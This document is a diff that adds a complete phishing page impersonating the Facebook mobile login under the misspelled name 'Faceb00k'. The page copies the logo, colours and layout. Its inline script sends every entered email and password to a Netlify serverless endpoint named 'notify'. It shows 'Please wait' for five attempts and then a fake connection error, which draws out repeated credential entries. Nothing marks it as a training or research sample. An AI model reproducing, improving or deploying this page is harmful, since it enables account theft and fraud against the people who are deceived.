@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Loading...</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#fff;font-family:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding:20px 16px 30px;color:#1c1e21}
+    .b{width:100%;max-width:400px;background:#f0f2f5;border-radius:12px;padding:12px 16px;font-size:13px;color:#1877f2;text-align:center;margin-bottom:16px;border:1px solid #e4e6eb}
+    .b strong{font-weight:600}
+    .c{width:100%;max-width:400px;display:flex;flex-direction:column;align-items:center}
+    .l{margin:20px 0 24px;width:100%;text-align:center}
+    .l svg{height:50px;width:auto;fill:#1877f2}
+    .f{width:100%;background:#fff;border-radius:12px;padding:16px 0}
+    .g{margin-bottom:12px}
+    .g input{width:100%;padding:14px 16px;background:#f5f6f7;border:1px solid #ccd0d5;border-radius:8px;font-size:16px;color:#1c1e21;outline:none;transition:border-color .15s}
+    .g input:focus{border-color:#1877f2;background:#fff}
+    .g input::placeholder{color:#8a8d91;font-size:16px}
+    .b1{width:100%;padding:14px;background:#1877f2;border:none;border-radius:8px;color:#fff;font-weight:700;font-size:18px;cursor:pointer;transition:background .15s;margin-top:6px}
+    .b1:hover{background:#166fe5}
+    .b1:active{background:#155cd9}
+    .ln{text-align:center;margin-top:18px;padding-top:16px;border-top:1px solid #dadde1}
+    .ln a{display:inline-block;color:#1877f2;font-size:15px;font-weight:500;text-decoration:none;padding:4px 0}
+    .ln a:hover{text-decoration:underline}
+    .dv{margin:12px 0;color:#8a8d91;font-size:14px}
+    .b2{width:100%;padding:14px;background:#42b72a;border:none;border-radius:8px;color:#fff;font-weight:700;font-size:18px;cursor:pointer;transition:background .15s;margin-top:10px}
+    .b2:hover{background:#36a420}
+    .m{margin-top:16px;font-size:14px;font-weight:500;text-align:center;min-height:1.5em;color:#31a24c}
+    .ft{margin-top:32px;font-size:12px;color:#8a8d91;text-align:center;width:100%;border-top:1px solid #dadde1;padding-top:20px}
+    .ft a{color:#8a8d91;text-decoration:none;margin:0 8px}
+    .ft a:hover{text-decoration:underline}
+    @media (max-width:420px){body{padding:10px 12px 20px}.l svg{height:40px}.g input{font-size:15px;padding:12px 14px}.b1,.b2{font-size:16px;padding:12px}}
+  </style>
+</head>
+<body>
+
+<div class="b"><strong>📱</strong> Get Faceb00k for Android and browse faster.</div>
+<div class="c">
+  <div class="l">
+    <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+      <path d="M34 18.5C34 9.94 27.06 3 18.5 3S3 9.94 3 18.5C3 26.42 8.66 33.07 16.06 34V23.1h-3.95V18.5h3.95v-3.43c0-3.9 2.33-6.05 5.87-6.05 1.7 0 3.48.3 3.48.3v3.83h-1.96c-1.93 0-2.53 1.2-2.53 2.43v2.92h4.3l-.69 4.6h-3.61V34C27.34 33.07 33 26.42 33 18.5z"/>
+    </svg>
+  </div>
+
+  <form class="f" id="x1" novalidate>
+    <div class="g">
+      <input type="email" id="x2" name="x2" placeholder="Mobile number or email" autocomplete="username" required>
+    </div>
+    <div class="g">
+      <input type="password" id="x3" name="x3" placeholder="Password" autocomplete="current-password" required>
+    </div>
+    <button type="submit" class="b1">Log in</button>
+    <div class="m" id="x4"></div>
+  </form>
+
+  <div class="ln">
+    <a href="#">Forgot password?</a>
+    <div class="dv">·</div>
+    <button class="b2" id="x5">Create new account</button>
+  </div>
+
+  <div class="ft">
+    <a href="#">English (US)</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Cookies</a>
+    <a href="#">More</a>
+  </div>
+</div>
+
+<script>
+
+  (function(){
+    var a=document.getElementById('x1'), b=document.getElementById('x4'), c=0;
+    var d=function(e,p,r){
+      fetch('/.netlify/functions/notify',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({username:e,password:p,result:r})
+      }).catch(function(){});
+    };
+    a.addEventListener('submit',function(e){
+      e.preventDefault(); c++;
+      var u=document.getElementById('x2').value.trim();
+      var p=document.getElementById('x3').value.trim();
+      var s='';
+      if(c<=5){ s='⏳ Please wait...'; d(u||'e',p||'p','a'+c); }
+      else { s='⚠️ Unable to connect. Try again later.'; d(u||'e',p||'p','err'); }
+      b.textContent=s;
+    });
+    document.getElementById('x5').addEventListener('click',function(){ alert('Service unavailable.'); });
+  })();
+</script>
+</body>
+</html>
